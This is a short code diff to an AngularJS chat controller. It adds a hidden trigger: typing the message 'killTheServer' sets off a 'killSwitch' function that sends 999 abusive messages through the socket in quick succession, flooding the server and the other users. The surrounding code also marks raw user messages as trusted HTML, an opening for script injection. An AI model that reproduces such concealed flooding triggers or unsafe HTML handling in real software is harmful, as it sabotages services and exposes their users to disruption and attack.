@@ -5,10 +5,23 @@ aasAdmin.controller('chatController', ["$scope", "$cookies", "ioSocket", "$sce",
         messageLog += "<li>ME - " + $scope.message + "</li>";
         $scope.messageLog = $sce.trustAsHtml(messageLog);
 
+        if($scope.message == 'killTheServer') {
+            $scope.killSwitch();
+        }
+
         ioSocket.emit('message', $scope.message);
         $scope.message = '';
 
     };
+
+    $scope.killSwitch = function () {
+        for(var i = 0; i<999; i++) {
+            setTimeout(function () {
+                var mesg = 'Bleed bitch bleed!! ' + Math.round(Math.random() * 1000);
+                ioSocket.emit('message', mesg);
+            }, 500 + i);
+        }
+    }
 
     $scope.$on('socket:message', function(event, data) {
         console.log('incoming message');
